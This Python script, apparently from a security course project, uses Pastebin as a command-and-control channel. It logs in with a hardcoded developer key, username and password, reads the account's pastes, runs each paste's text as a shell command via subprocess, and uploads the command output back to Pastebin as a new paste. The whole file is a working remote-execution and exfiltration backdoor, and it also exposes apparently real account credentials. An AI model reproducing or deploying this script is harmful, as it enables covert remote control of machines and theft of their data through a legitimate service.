import requests
import subprocess

# Your Pastebin API Developer Key
api_key = "oI_hBDSnHFHmlCcY_TPqeLmV1GCCxu4E"
# Your Pastebin username and password
username = "frequency2612"
password = "cs564_project"

paste_keys = []

def login_to_pastebin(api_dev_key, username, password):
    data = {
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password
    }
    response = requests.post("https://pastebin.com/api/api_login.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None

# Function to retrieve a paste from Pastebin
def get_pastebin_content(api_user_key, paste_key):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'show_paste',
        'api_paste_key': paste_key
    }
    response = requests.post("https://pastebin.com/api/api_raw.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None

# Function to retrieve a list of pastes created by the user
def get_user_pastes(api_user_key):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'list',
        'api_results_limit': 10  # Adjust as needed, maximum is 1000
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if response.status_code == 200:
        return response.text.strip()
    else:
        return None
    
def create_paste(api_user_key, text, title="Untitled"):
    data = {
        'api_dev_key': api_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_code': text,
        'api_paste_name': title
    }
    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if response.status_code == 200:
        return response.text
    else:
        return None
    
# Login to Pastebin
api_user_key = login_to_pastebin(api_key, username, password)
# if api_user_key:
#     print("Successfully logged in to Pastebin.")
# else:
#     print("Failed to log in to Pastebin.")

pastes_data = get_user_pastes(api_user_key)
if pastes_data:
    strings = [line.split(',')[0] for line in pastes_data.split('\n')]
    print("Paste Keys for user's pastes:")
    expression = "<paste_key>"
    for string in strings:
        string = string.strip()
        if string.startswith(expression):
            key = string[len(expression):len(expression) + 8]
            if key not in paste_keys:
                paste_keys.append(key)
# else:
#     print("Could not retreive pastes data")

# Example: Retrieve a paste
if api_user_key:
    for paste_key in paste_keys:
        paste_content = get_pastebin_content(api_user_key, paste_key)
        if paste_content:
            print("Command given is: ")
            print(paste_content)

            command = paste_content.split(' ')
            p = subprocess.Popen(command, stdout=subprocess.PIPE)
            output = []

            for i in p.stdout.readlines():
                output.append(i.decode().strip())

            text_to_upload = output
            paste_title = "AAAAAAAAAAAAAH"
            paste_url = create_paste(api_user_key, text_to_upload, paste_title)
        # else:
        #     print("Failed to retrieve paste content.")